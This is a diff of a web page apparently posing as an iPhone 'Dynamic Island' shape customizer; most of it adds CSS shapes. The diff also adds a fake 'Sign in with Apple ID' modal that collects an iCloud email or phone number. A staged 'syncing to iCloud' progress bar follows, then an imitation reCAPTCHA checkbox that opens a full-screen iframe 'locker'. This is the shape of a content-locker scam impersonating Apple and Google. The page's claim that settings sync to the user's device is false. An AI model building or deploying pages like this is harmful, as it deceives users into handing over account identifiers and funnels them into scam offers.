@@ -15,60 +15,70 @@
     
     <style>
         @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700&display=swap');
+        body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif; background-color: #F2F2F7; color: #000000; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; user-select: none; overflow-x: hidden; }
         
-        body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif; background-color: #F2F2F7; color: #000000; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; user-select: none; }
-        
-        /* ── Header & Status Bar ── */
         .status-bar { height: 50px; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; font-weight: 600; font-size: 14px; position: relative; z-index: 50; transition: color 0.3s ease; }
         .dynamic-island { position: absolute; left: 50%; transform: translateX(-50%); top: 8px; width: 105px; height: 30px; background-color: #000; z-index: 1; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
         
-        /* ── iOS Toggle ── */
         .ios-toggle { position: relative; width: 50px; height: 30px; appearance: none; background: #e9e9ea; border-radius: 30px; transition: all 0.3s ease; cursor: pointer; outline: none; }
         .ios-toggle::after { content: ''; position: absolute; top: 2px; left: 2px; width: 26px; height: 26px; background: #fff; border-radius: 50%; box-shadow: 0 2px 5px rgba(0,0,0,0.2); transition: all 0.3s ease; }
         .ios-toggle:checked { background: #34C759; }
         .ios-toggle:checked::after { transform: translateX(20px); }
         .ios-card { background-color: #FFFFFF; border-radius: 10px; margin: 0 16px; }
         
-        /* ── Color Circles ── */
         .color-row { display: flex; justify-content: space-between; align-items: center; padding: 4px 16px 16px 16px; }
         .color-circle { width: 28px; height: 28px; border-radius: 50%; cursor: pointer; position: relative; transition: transform 0.1s; display: flex; align-items: center; justify-content: center; }
         .color-circle:active { transform: scale(0.9); }
         .color-circle.selected::after { content: ''; position: absolute; top: -4px; left: -4px; right: -4px; bottom: -4px; border: 2px solid #8E8E93; border-radius: 50%; }
         
-        /* Presets */
-        .c-red { background-color: #FF3B30; } 
-        .c-orange { background-color: #FF9500; } 
-        .c-yellow { background-color: #FFCC00; } 
-        .c-green { background-color: #34C759; } 
-        .c-blue { background-color: #007AFF; } 
-        .c-purple { background-color: #AF52DE; }
-        
-        /* Color Wheel */
+        .c-red { background-color: #FF3B30; } .c-orange { background-color: #FF9500; } .c-yellow { background-color: #FFCC00; } .c-green { background-color: #34C759; } .c-blue { background-color: #007AFF; } .c-purple { background-color: #AF52DE; }
         .c-rainbow { background: conic-gradient(red, yellow, lime, aqua, blue, magenta, red); overflow: hidden; }
         .c-rainbow input[type="color"] { opacity: 0; width: 100%; height: 100%; cursor: pointer; border: none; padding: 0; }
 
-        /* ── Shapes Grid & CSS Art ── */
         .shape-btn { transition: all 0.2s ease; border: 2px solid transparent; }
         .shape-btn:active { transform: scale(0.95); }
-        .shape-btn.selected { border-color: #007AFF; background-color: #F0F8FF; }
+        .shape-btn.selected { border-color: #007AFF; background-color: #e0f0ff; }
         .shape-preview { background-color: #000; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
 
-        /* 1. Pill */
+        /* 🔥 CSS ART - 30 SHAPES 🔥 */
         .shape-pill { border-radius: 20px !important; clip-path: none !important; -webkit-mask-image: none !important; }
-        /* 2. Apple Logo */
-        .shape-apple { border-radius: 0 !important; clip-path: none !important; -webkit-mask-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.04 2.26-.79 3.59-.76 1.8.06 3.08.81 3.92 2.05-1.64 1-1.92 3.14-.38 4.19-.39 1.19-.94 2.45-1.6 3.25l-.61.44zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.32 2.41-2.08 4.29-3.74 4.25z'/%3E%3C/svg%3E") !important; -webkit-mask-size: contain !important; -webkit-mask-repeat: no-repeat !important; -webkit-mask-position: center !important; }
-        /* 3. Batman */
+        .shape-apple { border-radius: 0 !important; clip-path: none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.04 2.26-.79 3.59-.76 1.8.06 3.08.81 3.92 2.05-1.64 1-1.92 3.14-.38 4.19-.39 1.19-.94 2.45-1.6 3.25l-.61.44zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.32 2.41-2.08 4.29-3.74 4.25z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
         .shape-batman { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(50% 15%, 55% 15%, 60% 0%, 65% 15%, 85% 10%, 100% 40%, 80% 60%, 100% 80%, 75% 80%, 55% 100%, 50% 80%, 45% 100%, 25% 80%, 0% 80%, 20% 60%, 0% 40%, 15% 10%, 35% 15%, 40% 0%, 45% 15%) !important; }
-        /* 4. Heart */
-        .shape-heart { border-radius: 0 !important; clip-path: none !important; -webkit-mask-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z'/%3E%3C/svg%3E") !important; -webkit-mask-size: contain !important; -webkit-mask-repeat: no-repeat !important; -webkit-mask-position: center !important; }
-        /* 5. Cat Ears */
+        .shape-heart { border-radius: 0 !important; clip-path: none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
         .shape-cat { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(10% 25%, 15% 0, 25% 25%, 75% 25%, 85% 0, 90% 25%, 100% 50%, 90% 100%, 10% 100%, 0 50%) !important; }
-        /* 6. Bowtie / Ribbon */
         .shape-bow { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(0 0, 100% 0, 80% 50%, 100% 100%, 0 100%, 20% 50%) !important; }
-        /* 7. Sparkle */
         .shape-sparkle { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(50% 0%, 60% 40%, 100% 50%, 60% 60%, 50% 100%, 40% 60%, 0% 50%, 40% 40%) !important; }
-        /* 8. Shield */
         .shape-shield { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(50% 0%, 100% 10%, 100% 70%, 50% 100%, 0 70%, 0 10%) !important; }
+        .shape-diamond { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%) !important; }
+        .shape-crown { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(0 20%, 20% 40%, 50% 0, 80% 40%, 100% 20%, 100% 100%, 0 100%) !important; }
+        .shape-bubble { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(0 0, 100% 0, 100% 75%, 65% 75%, 45% 100%, 45% 75%, 0 75%) !important; }
+        .shape-star { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%) !important; }
+        .shape-cross { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(33% 0, 66% 0, 66% 33%, 100% 33%, 100% 66%, 66% 66%, 66% 100%, 33% 100%, 33% 66%, 0 66%, 0 33%, 33% 33%) !important; }
+        .shape-octagon { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(30% 0%, 70% 0%, 100% 30%, 100% 70%, 70% 100%, 30% 100%, 0% 70%, 0% 30%) !important; }
+        .shape-ticket { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(15% 0, 85% 0, 100% 15%, 100% 85%, 85% 100%, 15% 100%, 0 85%, 0 15%) !important; }
+        .shape-triangle { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(50% 0%, 0% 100%, 100% 100%) !important; }
+        .shape-slant { border-radius: 0 !important; -webkit-mask-image: none !important; clip-path: polygon(25% 0%, 100% 0%, 75% 100%, 0% 100%) !important; }
+        .shape-leaf { border-radius: 50% 0 !important; clip-path: none !important; -webkit-mask-image: none !important; }
+        
+        /* New Epic Shapes */
+        .shape-cloud { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M6.5 17.5A4.5 4.5 0 014 9.12a7.5 7.5 0 0115.75-1.5A4.5 4.5 0 0117.5 17.5h-11z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-bolt { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M13 2L3 14h9l-1 8 10-12h-9l1-8z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-moon { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-flame { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 2c0 0-5 5-5 10a5 5 0 0010 0c0-5-5-10-5-10zm0 13a2 2 0 110-4 2 2 0 010 4z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-ghost { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 2a9 9 0 00-9 9v11l3-3 3 3 3-3 3 3 3-3 3 3V11a9 9 0 00-9-9z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-camera { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M4 6h3l2-2h6l2 2h3a2 2 0 012 2v10a2 2 0 01-2 2H4a2 2 0 01-2-2V8a2 2 0 012-2zm8 11a4 4 0 100-8 4 4 0 000 8z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-eye { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17a5 5 0 110-10 5 5 0 010 10zm0-8a3 3 0 100 6 3 3 0 000-6z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-lock { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-target { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 2a10 10 0 100 20 10 10 0 000-20zm0 18a8 8 0 110-16 8 8 0 010 16zm0-14a6 6 0 100 12 6 6 0 000-12zm0 10a4 4 0 110-8 4 4 0 010 8zm0-6a2 2 0 100 4 2 2 0 000-4z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-hexagon { border-radius:0 !important; clip-path: polygon(25% 0%, 75% 0%, 100% 50%, 75% 100%, 25% 100%, 0% 50%) !important; -webkit-mask-image:none !important;}
+        .shape-drop { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 2c0 0-8 9-8 14a8 8 0 0016 0c0-5-8-14-8-14z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+        .shape-music { border-radius:0 !important; clip-path:none !important; -webkit-mask: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z'/%3E%3C/svg%3E") no-repeat center/contain !important; }
+
+
+        /* Animations */
+        .progress-animate { transition: width 4s linear; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .animate-slide-up { animation: slideUp 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
     </style>
 </head>
 <body>
@@ -76,7 +86,6 @@
     <div class="status-bar pt-2" id="statusBarText">
         <span id="clock" class="tracking-tight ml-2 z-10">7:44</span>
         <div class="dynamic-island shape-pill" id="dynamicIsland" style="width: 105px; height: 30px;"></div>
-        
         <div class="flex items-center gap-[4px] z-10" id="statusIcons">
             <svg width="17" height="11" viewBox="0 0 18 12" fill="currentColor"><rect x="1" y="8" width="3" height="4" rx="1"/><rect x="6" y="5" width="3" height="7" rx="1"/><rect x="11" y="2" width="3" height="10" rx="1"/><rect x="16" y="0" width="3" height="12" rx="1"/></svg>
             <div class="flex items-center ml-1">
@@ -139,60 +148,134 @@
         </div>
     </div>
 
-    <div class="mt-6 pb-12">
-        <h3 class="text-[#8E8E93] text-[12px] font-bold mb-3 px-6 uppercase tracking-wider">Dynamic Island Styles</h3>
-        
+    <div class="mt-6">
+        <div class="flex justify-between items-center px-6 mb-3">
+            <h3 class="text-[#8E8E93] text-[12px] font-bold uppercase tracking-wider">Dynamic Island Styles</h3>
+        </div>
         <div class="grid grid-cols-4 gap-3 px-4">
+            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn selected" data-shape="shape-pill" data-w="105px" data-h="30px"><div class="shape-preview shape-pill" style="width: 45px; height: 14px;"></div></div>
+            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-apple" data-w="32px" data-h="38px"><div class="shape-preview shape-apple" style="width: 25px; height: 30px;"></div></div>
+            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-batman" data-w="120px" data-h="40px"><div class="shape-preview shape-batman" style="width: 50px; height: 18px;"></div></div>
             
-            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn selected" data-shape="shape-pill" data-w="105px" data-h="30px">
-                <div class="shape-preview shape-pill" style="width: 45px; height: 14px;"></div>
+            <div onclick="openModal('shapesModal')" class="relative bg-gradient-to-br from-dark-000 via-dark-000 to-purple-500 rounded-xl h-[70px] flex flex-col justify-center items-center shadow-md cursor-pointer active:scale-95 transition-transform overflow-hidden group">
+                <div class="absolute inset-0 bg-black/20"></div>
+                <i class="ri-add-fill text-black text-[28px] drop-shadow-sm font-bold"></i>
+                <span class="text-[10px] text-black font-bold mt-1 uppercase tracking-widest drop-shadow-sm">More</span>
             </div>
-
-            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-apple" data-w="32px" data-h="38px">
-                <div class="shape-preview shape-apple" style="width: 25px; height: 30px;"></div>
-            </div>
-
-            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-batman" data-w="120px" data-h="40px">
-                <div class="shape-preview shape-batman" style="width: 50px; height: 18px;"></div>
-            </div>
-
-            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-heart" data-w="35px" data-h="35px">
-                <div class="shape-preview shape-heart" style="width: 28px; height: 28px;"></div>
-            </div>
-
-            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-cat" data-w="100px" data-h="32px">
-                <div class="shape-preview shape-cat" style="width: 45px; height: 15px;"></div>
-            </div>
-
-            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-bow" data-w="80px" data-h="25px">
-                <div class="shape-preview shape-bow" style="width: 40px; height: 15px;"></div>
-            </div>
-
-            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-sparkle" data-w="35px" data-h="35px">
-                <div class="shape-preview shape-sparkle" style="width: 25px; height: 25px;"></div>
-            </div>
-
-            <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-shield" data-w="35px" data-h="42px">
-                <div class="shape-preview shape-shield" style="width: 25px; height: 30px;"></div>
-            </div>
-
         </div>
     </div>
 
+    <div class="px-6 pb-12 mt-8">
+        <button onclick="openModal('icloudModal')" 
+                class="w-full bg-[#000] text-white text-[17px] font-semibold py-4 rounded-full flex items-center justify-center gap-2 shadow-xl shadow-gray-400/50 active:scale-95 transition-all duration-300 border-2 border-transparent hover:border-blue-500">
+            <i class="ri-apple-fill text-2xl"></i> Active to My Device
+        </button>
+    </div>
+
+
+    <div id="shapesModal" class="fixed inset-0 bg-black/50 backdrop-blur-sm z-[80] hidden items-end justify-center">
+        <div class="bg-[#f2f2f7] w-full h-[75vh] rounded-t-3xl relative flex flex-col shadow-2xl animate-slide-up">
+            <div class="p-4 flex justify-between items-center border-b border-gray-300">
+                <h3 class="font-bold text-[17px]">Select Shape <span class="text-gray-400 font-normal text-sm ml-1">(30 Options)</span></h3>
+                <button onclick="closeModal('shapesModal')" class="w-8 h-8 bg-gray-200 text-gray-600 rounded-full flex items-center justify-center font-bold text-lg hover:bg-gray-300">✕</button>
+            </div>
+            
+            <div class="p-4 overflow-y-auto grid grid-cols-4 gap-3 flex-1 pb-10" id="shapeGrid">
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn selected" data-shape="shape-pill" data-w="105px" data-h="30px"><div class="shape-preview shape-pill" style="width: 45px; height: 14px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-apple" data-w="32px" data-h="38px"><div class="shape-preview shape-apple" style="width: 25px; height: 30px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-batman" data-w="120px" data-h="40px"><div class="shape-preview shape-batman" style="width: 50px; height: 18px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-heart" data-w="35px" data-h="35px"><div class="shape-preview shape-heart" style="width: 28px; height: 28px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-cat" data-w="100px" data-h="32px"><div class="shape-preview shape-cat" style="width: 45px; height: 15px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-bow" data-w="80px" data-h="25px"><div class="shape-preview shape-bow" style="width: 40px; height: 15px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-sparkle" data-w="35px" data-h="35px"><div class="shape-preview shape-sparkle" style="width: 25px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-shield" data-w="35px" data-h="42px"><div class="shape-preview shape-shield" style="width: 25px; height: 30px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-diamond" data-w="40px" data-h="40px"><div class="shape-preview shape-diamond" style="width: 25px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-crown" data-w="50px" data-h="35px"><div class="shape-preview shape-crown" style="width: 30px; height: 20px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-bubble" data-w="50px" data-h="40px"><div class="shape-preview shape-bubble" style="width: 30px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-star" data-w="45px" data-h="45px"><div class="shape-preview shape-star" style="width: 28px; height: 28px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-cross" data-w="40px" data-h="40px"><div class="shape-preview shape-cross" style="width: 25px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-octagon" data-w="40px" data-h="40px"><div class="shape-preview shape-octagon" style="width: 25px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-ticket" data-w="80px" data-h="30px"><div class="shape-preview shape-ticket" style="width: 45px; height: 18px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-triangle" data-w="45px" data-h="40px"><div class="shape-preview shape-triangle" style="width: 28px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-slant" data-w="80px" data-h="30px"><div class="shape-preview shape-slant" style="width: 45px; height: 15px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-leaf" data-w="50px" data-h="30px"><div class="shape-preview shape-leaf" style="width: 30px; height: 18px;"></div></div>
+                
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-cloud" data-w="60px" data-h="40px"><div class="shape-preview shape-cloud" style="width: 35px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-bolt" data-w="35px" data-h="45px"><div class="shape-preview shape-bolt" style="width: 25px; height: 30px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-moon" data-w="35px" data-h="35px"><div class="shape-preview shape-moon" style="width: 25px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-flame" data-w="35px" data-h="40px"><div class="shape-preview shape-flame" style="width: 25px; height: 30px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-ghost" data-w="40px" data-h="40px"><div class="shape-preview shape-ghost" style="width: 25px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-camera" data-w="50px" data-h="40px"><div class="shape-preview shape-camera" style="width: 30px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-eye" data-w="50px" data-h="30px"><div class="shape-preview shape-eye" style="width: 30px; height: 18px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-lock" data-w="35px" data-h="45px"><div class="shape-preview shape-lock" style="width: 22px; height: 30px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-target" data-w="40px" data-h="40px"><div class="shape-preview shape-target" style="width: 25px; height: 25px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-hexagon" data-w="50px" data-h="45px"><div class="shape-preview shape-hexagon" style="width: 30px; height: 28px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-drop" data-w="35px" data-h="45px"><div class="shape-preview shape-drop" style="width: 25px; height: 32px;"></div></div>
+                <div class="bg-white rounded-xl h-[70px] flex justify-center items-center shadow-sm cursor-pointer shape-btn" data-shape="shape-music" data-w="35px" data-h="40px"><div class="shape-preview shape-music" style="width: 25px; height: 28px;"></div></div>
+            </div>
+        </div>
+    </div>
+
+
+    <div id="icloudModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] hidden items-center justify-center px-4">
+        <div class="bg-[#f2f2f7] w-full max-w-sm rounded-2xl p-6 text-center shadow-2xl">
+            <i class="ri-apple-fill text-5xl mb-2"></i>
+            <h3 class="text-[19px] font-semibold mb-2">Sign in with Apple ID</h3>
+            <p class="text-[13px] text-gray-500 mb-6 leading-relaxed">Enter your iCloud ID to sync these customized settings to your device.</p>
+            <input type="email" id="appleIdInput" placeholder="Email or Phone Number" class="w-full p-3 rounded-lg border border-gray-300 mb-4 outline-none focus:border-[#007AFF] text-[15px]">
+            <button onclick="startSync()" class="w-full bg-[#007AFF] text-white font-semibold py-3 rounded-xl text-[16px]">Activate</button>
+            <button onclick="closeModal('icloudModal')" class="w-full mt-3 text-[#007AFF] font-medium py-2 text-[15px]">Cancel</button>
+        </div>
+    </div>
+
+    <div id="loadingModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] hidden items-center justify-center px-4">
+        <div class="bg-[#f2f2f7] w-full max-w-sm rounded-2xl p-6 text-center shadow-2xl">
+            <h3 class="text-lg font-semibold mb-2">Syncing to Device...</h3>
+            <p class="text-sm text-gray-500 mb-6">Please do not close this page.</p>
+            <div class="w-full bg-gray-300 rounded-full h-2 mb-2 overflow-hidden">
+                <div id="syncProgress" class="bg-[#007AFF] h-2 rounded-full w-0 progress-animate"></div>
+            </div>
+            <p class="text-xs text-gray-400 mt-2">Connecting to iCloud Server</p>
+        </div>
+    </div>
+
+    <div id="captchaModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] hidden items-center justify-center px-4">
+        <div class="bg-white w-full max-w-sm rounded-xl p-6 text-center shadow-2xl">
+            <h3 class="text-[22px] text-black mb-1">Verify that it's you</h3>
+            <p class="text-gray-600 text-sm mb-6">Confirm that you're not a robot</p>
+            <div class="bg-[#f9f9f9] border border-[#d3d3d3] rounded p-3 flex items-center justify-between cursor-pointer hover:shadow-md transition-shadow" onclick="triggerLocker()">
+                <div class="flex items-center gap-3">
+                    <div id="rc-check" class="w-7 h-7 bg-white border-2 border-[#c1c1c1] rounded-sm"></div>
+                    <div id="rc-spinner" class="hidden w-7 h-7 border-2 border-transparent border-t-blue-500 rounded-full animate-spin"></div>
+                    <span class="text-black text-sm">I'm not a robot</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="32" class="opacity-80 mb-1">
+                    <div class="text-[10px] text-gray-500 font-medium">Privacy - Terms</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="lockerModal" class="fixed inset-0 bg-black/95 z-[999] hidden items-center justify-center">
+        <div class="w-full max-w-[500px] h-[85vh] bg-white rounded-2xl relative overflow-hidden">
+            <button onclick="closeModal('lockerModal')" class="absolute top-2 right-2 w-8 h-8 bg-black/10 rounded-full flex items-center justify-center z-50 text-black">✕</button>
+            <iframe id="lockerIframe" class="w-full h-full border-none"></iframe>
+        </div>
+    </div>
+
+
     <script>
+        // Colors & Customization State
         const colorMap = { 'c-red': '#FF3B30', 'c-orange': '#FF9500', 'c-yellow': '#FFCC00', 'c-green': '#34C759', 'c-blue': '#007AFF', 'c-purple': '#AF52DE' };
-        
         let isCustomizationOn = false;
         const mainToggle = document.getElementById('mainToggle');
